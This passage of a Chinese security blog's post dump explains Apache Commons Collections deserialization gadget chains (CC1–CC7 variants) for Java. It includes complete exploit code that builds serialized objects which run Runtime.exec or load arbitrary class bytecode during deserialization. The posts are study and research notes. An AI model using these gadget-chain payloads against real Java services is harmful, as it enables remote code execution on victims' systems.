reconstitutionPut(table, key, value); &#125;&#125;private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value)&#123; int hash = key.hashCode(); int index = (hash &amp; 0x7FFFFFFF) % tab.length; fo r (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123; if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; throw new java.io.StreamCorruptedException(); &#125; &#125; Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index]; tab[index] = new Entry&lt;&gt;(hash, key, value, e); count++;&#125; 在反序列化执行readObject方法时，会遍历读取被序列化对象中的键值对，就是在tableMap.put(decorateEXP, &quot;value4&quot;);中传入的键值对，当读取第一个键值对并进入reconstitutionPut方法时，会先根据key获得hash，然后获得index(类似于脚标,用来标记存放值的位置)，之后进入循环，但是循环创建e时出现问题，当前并没有tab对象，tab是循环结束后创建的。也就是说当readObject中第一次循环进入reconstitutionPut时，并没有进入该方法的for循环，而是根据传入的参数进行赋值计算，然后把这些值作为一个Entry放入到tab[index]中。 此时readObject第一次循环结束，然后进入到第二次循环，再次进入reconstitutionPut方法中，然后根据当前运行时传入的key计算获得hash。此时在上一次循环中已经创建tab，并且将上一次获取的Entry放入的tab中，那么就会进入循环。这里就是在遍历tab中的每一个Entry实体，获取在将Entry放入时的hash，与当前准备存入的Entry的hash进行比对，如果相同就会报错，不同则放入tab中进入下一次循环。 简单来说，就是reconstitutionPut会将当前接收的key.hash已经还原过的Entry中的hash进行比对，相同就会进入e.key.equals(key)执行到后续恶意代码。 那么我们如何保证比对双方的hash相同呢？这里的hash都是通过int hash = key.hashCode();计算再放入，这里的key是来自于反序列化时读取到的key，就是我们传入其中的LazyMap。 那么我们构造的两个LazyMap放入相同的map即可。 此时给两个LazyMap放入相同的map，那么此时获取的LazyMap也是相同的，也就是说在反序列化时，获得两个Entry都是相同的，那么必然会触发报错。 但是真的是这样吗？ 此时进行序列化再反序列化，readObject只执行了一次，这是为什么？ 原因在与Hashtable#put方法对传入的key进行了hash计算，hash相同时并且字符相等时，key不变，后面的value会替换之前的value，这是Map系列集合中的特性，为了保持键值对的唯一性。 此时好像进入了一个死局，要执行后续代码就要传入两个相同的Map，当时相同的Map又不能同时存在。这里就利用到java中的一个小bug：在java中，yy和zZ的hash值时相等的，直接通过代码System.out.println(&quot;yy&quot;.hashCode() + &quot;+++&quot; + &quot;zZ&quot;.hashCode());就可以得到，但是这里yy和zZ又不满足equals，那么如果我们构造的两个LazyMap中分别使用这两个值，就能保持序列化的时候，hash相同但是能够put，反序列化时key.hash又是相同的 再次进行序列化和反序列化，当第二次循环时发现，当前key中存在两个键值对，这是为什么呢？ 这里的原因出在Hashtable#put，在第一次put时，Hashtable中没有值，就不会进入循环，第二次put时就会进入循环，然后我们又满足了entry.hash == hash，就会进入equals方法，这里最后会进入到LazyMap#get，这里在之前说过，运行的结果LazyMap#get作为懒加载，对Hashtable第二次put时的键值对新加了一对键值对。 在put之后直接通过remove去除即可。同时，这里传入的两个LazyMap，无法决定反序列化时谁第一次循环，谁第二次循环，所以都要传入恶意chansformer，那么这里防止序列化执行命令的反射操作就要进行修改，这里通过反射处理ChainedTransformer中的属性。 构造出来的最终EXP如下： 12345678910111213141516171819202122232425262728293031323334public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;&#125;); // 恶意的LazyMap，放入equals中的 HashMap&lt;Object, Object&gt; hMap1 = new HashMap&lt;&gt;(); hMap1.put(&quot;yy&quot;, &quot;value1&quot;); LazyMap decorateEXP = (LazyMap) LazyMap.decorate(hMap1, chainedTransformer); //传入一个普通Map Map decorate = LazyMap.decorate(new HashMap&lt;&gt;(), chainedTransformer); decorate.put(&quot;zZ&quot;, &quot;value1&quot;); Hashtable&lt;Object, Object&gt; tableMap = new Hashtable&lt;&gt;(); tableMap.put(decorate, &quot;value3&quot;); tableMap.put(decorateEXP, &quot;value4&quot;); decorateEXP.remove(&quot;zZ&quot;); Class&lt;? extends ChainedTransformer&gt; aClass = chainedTransformer.getClass(); Field iTransformersField = aClass.getDeclaredField(&quot;iTransformers&quot;); iTransformersField.setAccessible(true); iTransformersField.set(chainedTransformer, transformers); util.serialize(tableMap); util.unserialize(&quot;ser.bin&quot;); &#125;","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]},{"title":"浅述CC链(7)：CC链5","slug":"CC链5","date":"2025-07-20T08:04:03.000Z","updated":"2025-07-21T15:25:02.248Z","comments":true,"path":"2025/07/20/CC链5/","permalink":"http://example.com/2025/07/20/CC%E9%93%BE5/","excerpt":"","text":"CC链5CC链5就是在CC链1-LazyMap的基础上进行修改。CC链1-LazyMap中LazyMap#get利用的调用点是AnnotationInvocationHandler#invoke。在CC链5中则是换成了TiedMapEntry#toString。也就是说CC链5还是基于commons-collections:3.2.1版本 所以执行点还是采用CC链1-LazyMap，把后面的调用点和入口进行更换即可 调用点：TiedMapEntry#toString查找LazyMap#get的调用，在TiedMapEntry#getValue中存在调用，然后继续查找这个方法的调用 123public Object getValue() &#123; return map.get(key);&#125; 然后在TiedMapEntry#toString方法中找到了调用 123public String toString() &#123; return getKey() + &quot;=&quot; + getValue();&#125; 在这个类中，根据构造方法需要传入一个map和一个key。这里的map要去调用LazyMap#get，所以这里传入构造的LazyMap，按照之前的思路，key这里其实可以随意传入参数，或者传入反射获取的Runtime.getRuntime()，从而不必通过ConstantTransformer进行传入 那么根据当前状态构造出EXP如下： 12345678910111213141516171819public static void main(String[] args) &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, &quot;aaa&quot;); tiedMapEntry.toString(); //new BadAttributeValueExpException&#125; 下一步就需要寻找toString的调用 反序列化入口：BadAttributeValueExpException#readObject在BadAttributeValueExpException#readObject方法中存在toString的同名方法调用 123456789101112131415161718192021private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(&quot;val&quot;, null); if (valObj == null) &#123; val = null; &#125; else if (valObj instanceof String) &#123; val= valObj; &#125; else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) &#123; val = valObj.toString(); &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName(); &#125;&#125; 这里的valObj需要传入构造的tiedMapEntry对象，看看valObj的赋值 ois.readFields()是从输入流中读取当前类的所有非transient、非static的字段值，然后通过get方法获取名叫val的属性，也就是说valObj来自于属性val 而val的赋值来自于构造方法 这里的三元运算符意思是：如果接收的val是bull，那么this.val就是null。如果不是则赋值val.toString。 也就是说我们传入tiedMapEntry在赋值时就会执行一次toString，为了避免这种情况，后续还是采用反射的方法，先传入一个任意值，然后通过反射修改赋值，最后进行序列化。 EXP构造根据调用过程，我们需要构造一个BadAttributeValueExpException对象，然后传入tiedMapEntry对象，那么此时EXP如下： 12345678910111213141516171819public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, &quot;aaa&quot;); //tiedMapEntry.toString(); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(tiedMapEntry); util.serialize(badAttributeValueExpException); util.unserialize(&quot;ser.bin&quot;);&#125; 运行的时候发现，序列化时弹出了计算器，但是反序列化时没有执行。 序列化时弹出计算器是因为构造方法实例化对象时执行了toString方法，那么我们先把这个问题进行处理。也就是通过反射修改值，效果如下： 1234567891011121314151617181920212223242526public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, &quot;aaa&quot;); //tiedMapEntry.toString(); // 创建时传入任意值，然后通过反射修改回来 BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(&quot;bbb&quot;); Class&lt;? extends BadAttributeValueExpException&gt; aClass = badAttributeValueExpException.getClass(); Field valFeild = aClass.getDeclaredField(&quot;val&quot;); valFeild.setAccessible(true); valFeild.set(badAttributeValueExpException, tiedMapEntry); util.serialize(badAttributeValueExpException); util.unserialize(&quot;ser.bin&quot;);&#125; 此时序列化已经不会弹出计算器了，并且反序列化时也会弹出计算器，反序列化这里问题应该和CC链1-LazyMap差不多，是LazyMap的懒加载相关导致的","categories":[],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]},{"title":"浅述CC链(6)：CC链2","slug":"CC链2","date":"2025-07-20T07:21:11.000Z","updated":"2025-07-20T08:03:49.860Z","comments":true,"path":"2025/07/20/CC链2/","permalink":"http://example.com/2025/07/20/CC%E9%93%BE2/","excerpt":"","text":"CC链2CC链2只是在CC链4的基础上进行了简单的修改。YSO中CC链4是继续查找TemplatesImpl类的调用，也就是CC链3中的执行点TrAXFilter（虽然我没有这么写）。CC链2就是通过invoke直接去反射创建TemplatesImpl，中间的调用点还是基于优先队列 所以这里直接把CC链4的的执行点改造一下即可，需要注意的是，改造之后在序列化时也会执行命令，所以这里需要先在代码赋值时改变原本的调用链，然后再通过反射修改属性，最后再进行序列化 那么构造的最终EXP效果如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546public class CC2 &#123; public static void main(String[] args) throws Exception &#123; TemplatesImpl templates = new TemplatesImpl(); // 通过反射给属性进行赋值 Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass(); Field nameFied = templatesClass.getDeclaredField(&quot;_name&quot;); nameFied.setAccessible(true); nameFied.set(templates, &quot;aaa&quot;); Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\\\Temp\\\\RCE.class&quot;)); byte[][] codes = &#123;code&#125;; bytecodesField.set(templates, codes); Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); Transformer[] transformers = &#123; new ConstantTransformer(templates), new InvokerTransformer(&quot;newTransformer&quot;, new Class[]&#123;&#125;, null) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); //int compare = transformingComparator.compare(1, 2); PriorityQueue&lt;Object&gt; objects = new PriorityQueue&lt;Object&gt;(2, new TransformingComparator(new ConstantTransformer(1))); Class&lt;? extends PriorityQueue&gt; aClass = objects.getClass(); Field sizeField = aClass.getDeclaredField(&quot;size&quot;); sizeField.setAccessible(true); sizeField.setInt(objects, 2); Field comparatorField = aClass.getDeclaredField(&quot;comparator&quot;); comparatorField.setAccessible(true); comparatorField.set(objects, transformingComparator); //util.serialize(objects); util.unserialize(&quot;ser.bin&quot;); &#125;&#125;","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]},{"title":"浅述CC链(5)：CC链4","slug":"CC链4","date":"2025-07-17T13:51:02.000Z","updated":"2025-07-21T16:12:23.329Z","comments":true,"path":"2025/07/17/CC链4/","permalink":"http://example.com/2025/07/17/CC%E9%93%BE4/","excerpt":"","text":"CC链4CC链1、3、6都是组件commons-collections 3.2.1及之前的版本，CC链4则是利用commons-collections 4.0这个版本中的组件。 在CC链4中TransformingComparator提供了serializeable序列化接口。 其实和前面三条链没有太大变化，唯一变化的就是中间的调用点部分 执行点：InvokerTransformer执行点依旧是InvokerTransformer，使用命令执行还是动态加载都可以，我这里使用命令执行。 调用点：TransformingComparator#compare这里依旧查找transform的调用，只不过这一次是寻找commons-collections 4.0中的调用，然后找到了TransformingComparator#compare这个点 12345public int compare(final I obj1, final I obj2) &#123; final O value1 = this.transformer.transform(obj1); final O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2);&#125; 可以看到这里是个很常见的方法，就是接收两个参数进行比较，这里的transformer是通过构造方法赋值，那么创建这个对象就可以把恶意transformer传进去 构造如下代码，就能够执行弹出计算器 123456789101112public static void main(String[] args) &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); int compare = transformingComparator.compare(1, 2);&#125; 调用点：PriorityQueue#siftDownUsingComparatorcompare的可利用调用点在PriorityQueue#siftDownUsingComparator这个地方，PriorityQueue是java中优先队列相关类，这里这个调用方法就涉及到二叉树之类的算法，这里直接看代码比较麻烦，可以先打上断点，后续通过动态调试来确定EXP应该如何构造 12345678910111213141516private void siftDownUsingComparator(int k, E x) &#123; int half = size &gt;&gt;&gt; 1; while (k &lt; half) &#123; int child = (k &lt;&lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0) c = queue[child = right]; if (comparator.compare(x, (E) c) &lt;= 0) break; queue[k] = c; k = child; &#125; queue[k] = x;&#125; 这里的comparator需要传入我们前面构造的transformingComparator，而comparator是通过构造方法赋值的。 调用点：PriorityQueue#siftDown查找siftDownUsingComparator的调用，也在当前类中，具体是siftDown这个方法 123456private void siftDown(int k, E x) &#123; if (comparator != null) siftDownUsingComparator(k, x); else siftDownComparable(k, x);&#125; 调用点：PriorityQueue#heapify查找PriorityQueue#siftDown的调用，还是在当前类的heapify方法中 1234private void heapify() &#123; for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--) siftDown(i, (E) queue[i]);&#125; 反序列化入口：PriorityQueue#readObject查找PriorityQueue#heapify的调用点，直接找到了当前类的readObject方法，那么就可以把这里当作反序列化入口来构造EXP 123456789101112131415161718private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); queue = new Object[size]; // Read in all elements. for (int i = 0; i &lt; size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in &quot;proper order&quot;, but the // spec has never explained what that might be. heapify();&#125; EXP构造查看PriorityQueue的构造方法，是public修饰，那么就可以直接创建对象，这里接收两个参数，第一个是个数字并且不能小于1，第二个就是我们构造的恶意transformingComparator 123456789public PriorityQueue(int initialCapacity, Comparator&lt;? super E&gt; comparator) &#123; // Note: This restriction of at least one is not actually needed, // but continues for 1.5 compatibility if (initialCapacity &lt; 1) throw new IllegalArgumentException(); this.queue = new Object[initialCapacity]; this.comparator = comparator;&#125; 那么就新建一个对象，传入参数然后进行序列化，大概就是这个样子 123456789101112131415public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); //int compare = transformingComparator.compare(1, 2); PriorityQueue&lt;Object&gt; objects = new PriorityQueue&lt;Object&gt;(2, transformingComparator); util.serialize(objects); util.unserialize(&quot;ser.bin&quot;);&#125; 接下来通过打断点进行动态调试，来修改参数 动态调试在各个调用点依次打上断点，先对恶意对象序列化，然后在反序列化时进行调试 在heapify处遇到了问题，这里相当于是将size除以2，然后遍历，但是我们这里size为0，不会进入循环，就不会调用到后续函数 所以我们这里采用反射，直接修改size的值为2，这样就会进入一次循环 123456789101112131415161718192021public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); //int compare = transformingComparator.compare(1, 2); PriorityQueue&lt;Object&gt; objects = new PriorityQueue&lt;Object&gt;(2, transformingComparator); Class&lt;? extends PriorityQueue&gt; aClass = objects.getClass(); Field sizeField = aClass.getDeclaredField(&quot;size&quot;); sizeField.setAccessible(true); sizeField.setInt(objects, 2); util.serialize(objects); util.unserialize(&quot;ser.bin&quot;);&#125; 此时反序列化调试已经能够成功进入循环，并且能够直接弹出计算器 与yso中CC链4的差异我这里和yso中的CC链4是不同的，yso中使用的是CC链3中TrAXFilter这里去进行动态加载，我这里采用命令执行 另外对size的处理也不同，yso中是通过优先队列的特性，直接通过priorityQueue.add(1); 去修改size，我这里是直接通过反射去修改","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]},{"title":"浅述CC链(4)：CC链3","slug":"CC链3","date":"2025-07-13T14:20:21.000Z","updated":"2025-07-16T16:09:48.535Z","comments":true,"path":"2025/07/13/CC链3/","permalink":"http://example.com/2025/07/13/CC%E9%93%BE3/","excerpt":"","text":"CC链3CC链3和CC链6以及CC链1的执行点不同，采用的是类动态加载的方式，CC链6和CC链1是命令执行，而CC链3则是代码执行。 简单来说，CC链1和CC链6都是通过InvokerTransfomer传入执行Runtime类的方法来执行命令 而CC链3是通过通过InvokerTransfomer传入执行构造出来的类加载器来执行指定的JAVA代码 相当于给CC1和CC6构造了一个更复杂的执行点 简述动态加载在类的动态加载中，一般是通过ClassLoader-&gt;loadclass-&gt;findClass-&gt;defineClass这个流程进行类加载，在最后的defineClass加载java字节码，但是只加载字节码是不运行代码的，还需要找到一个初始化的地方才会运行类中的代码 执行点：ClassLoader在classLoader中存在许多defineClass方法，我们需要找到一个被外部调用的，找到了下面这个方法 12345protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len) throws ClassFormatError&#123; return defineClass(name, b, off, len, null);&#125; 这里面的参数分别是： name：类的全限定名，就是包名.类名的形式 b：要加载的类的字节码数组 off：b的起始偏移量，即从哪个索引开始读取字节码，一般是0 len：要读取的字节码的长度，一般是b.length 调用点：TemplatesImpl.TransletClassLoader查找外部调用了defineClass方法的地方，找到了TemplatesImpl下面的一个静态类：TransletClassLoader 123456static final class TransletClassLoader extends ClassLoader &#123; ...... Class defineClass(final byte[] b) &#123; return defineClass(null, b, 0, b.length); &#125;&#125; 这里的defineClass没有修饰符，默认是default，在当前包中查找调用。只接收一个参数，java类的字节码文件。继续查找调用 调用点：TemplatesImpl#defineTransletClasses在当前类中找到defineTransletClasses方法中存在一处调用，这里获得了字节码，然后进行赋值操作 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950private void defineTransletClasses() throws TransformerConfigurationException &#123; if (_bytecodes == null) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); &#125; TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() &#123; public Object run() &#123; return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); &#125; &#125;); try &#123; final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount &gt; 1) &#123; _auxClasses = new HashMap&lt;&gt;(); &#125; for (int i = 0; i &lt; classCount; i++) &#123; _class[i] = loader.defineClass(_bytecodes[i]); // 在这里进行调用 final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123; _transletIndex = i; &#125; else &#123; _auxClasses.put(_class[i].getName(), _class[i]); &#125; &#125; if (_transletIndex &lt; 0) &#123; ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; catch (ClassFormatError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; catch (LinkageError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125;&#125; 这里的_bytecodes来自于构造方法，在类的实例化时创建 继续查找这个方法的调用点，查找到三处，这里选择其中getTransletInstance方法 调用点：TemplatesImpl#getTransletInstance选择这处调用的原因是该方法代码中使用了newInstance进行初始化，意味着走完这个函数就能动态加载完字节码并执行，另外两处都没有进行初始化。并且这里是一个get方法，fastjson中的一条链就是这里，具体后续针对fastjson再说。 1234567891011121314151617181920private Translet getTransletInstance() throws TransformerConfigurationException &#123; try &#123; if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) &#123; translet.setAuxiliaryClasses(_auxClasses); &#125; return translet; &#125; 这里我们需要查看_class[_transletIndex]是如何赋值的，这里赋值其实就是在defineTransletClasses方法中进行的，具体位置如下图： 注意这里，遍历时调用了每一个defineClass[i]，这里其实就是在遍历加载类字节码数组，同时后续构造参数时还需要注意这里。 那么这里_class[_transletIndex]就是可控的，接下来继续寻找getTransletInstance方法的调用 调用点：TemplatesImpl#newTransformerTemplatesImpl#getTransletInstance这个方法的调用点只有一处，在当前类的Transformer方法中 1234567891011121314151617public synchronized Transformer newTransformer() throws TransformerConfigurationException&#123; TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) &#123; transformer.setURIResolver(_uriResolver); &#125; if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123; transformer.setSecureProcessing(true); &#125; return transformer;&#125; 这里是一个public方法，在new TransformerImpl直接调用，那么可以在这里尝试构造EXP了 EXP初步构造构造函数之前需要确定参数调用以及赋值 在TemplatesImpl#getTransletInstance中，需要给_name属性赋值，但是这里不在构造方法中进行赋值，所以需要手动赋值 在TemplatesImpl#defineTransletClasses中，_bytecodes需要赋值，_tfactory在过程中需要调用方法，也需要赋值 需要注意赋值的类型，_name仅判断是否为空，可以赋值任意字符串。_bytecodes是以二维数组的形式传入需要加载的类字节码数组。 注意这里_tfactory是通过transient修饰，即不可序列化的变量，所以给他赋值是没有意义的，因为反序列化时是不会被传入的 那么应该怎么处理这里？既然需要这个属性，又无法被序列化，那么可以在反序列化的地方看看是如何赋值的，即查看readObject方法中是如何传递的 可以看到，在反序列化时这里是直接被创建的 但是我们现在需要的是正向执行看EXP的效果，所以这里还是需要暂时进行赋值，构造出代码如下： 这段代码基本满足调用逻辑，并且运行时能够执行加载的类中的代码，则说明没问题 12345678910111213141516171819202122232425public static void main(String[] args) throws Exception &#123; TemplatesImpl templates = new TemplatesImpl(); // 通过反射给属性进行赋值 Class&lt;? extends TemplatesImpl&gt; aClass = templates.getClass(); Field nameFied = aClass.getDeclaredField(&quot;_name&quot;); nameFied.setAccessible(true); nameFied.set(templates, &quot;aaa&quot;); Field bytecodesField = aClass.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); // _bytecodes 是一个二维数组，但是参数传递过程中通过遍历获取其中的每一个一维数组进行加载 // 这里先将字节码读取为一个一维数组，然后把这个一维数组放入一个二维数组 byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\\\Temp\\\\RCE.class&quot;)); byte[][] codes = &#123;code&#125;; bytecodesField.set(templates, codes); Field tfactoryField = aClass.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); templates.newTransformer();&#125; 但是这里报空指针异常了，断点调试一下，发现问题出在defineTransletClasses方法中 这里判断加载类的父类的名字是否包含这个常量，如果不是走入else，else中变量_auxClasses为空，所以就会报空指针异常 那么问题找到了，这里存在两种方法处理： 要加载的类字节码继承这个父类 给_auxClasses赋值 但是看下面代码中判断了_transletIndex是否小于0，是的话就会报错。进入else时这个属性值是-1，所以第二种方法不可用，我们选择第一种 让自定义加载类继承父类并处理报错之后，重新编译。再次执行就能成功加载到自定义的类文件。那么说明我们这里没问题。 接下来只需要将这部分代码和CC链1的反序列化入口结合就完成了这条链。 结合CC链1-LazyMap反序列化入口构造EXP将构造的templates类加载器结合CC链1，即修改InvokerTransformer传入执行的方法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public static void main(String[] args) throws Exception &#123; TemplatesImpl templates = new TemplatesImpl(); // 通过反射给属性进行赋值 Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass(); Field nameFied = templatesClass.getDeclaredField(&quot;_name&quot;); nameFied.setAccessible(true); nameFied.set(templates, &quot;aaa&quot;); Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); // _bytecodes 是一个二维数组，但是参数传递过程中通过遍历获取其中的每一个一维数组进行加载 // 这里先将字节码读取为一个一维数组，然后把这个一维数组放入一个二维数组 byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\\\Temp\\\\RCE.class&quot;)); byte[][] codes = &#123;code&#125;; bytecodesField.set(templates, codes); Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); Transformer[] transformers = &#123; new ConstantTransformer(templates), new 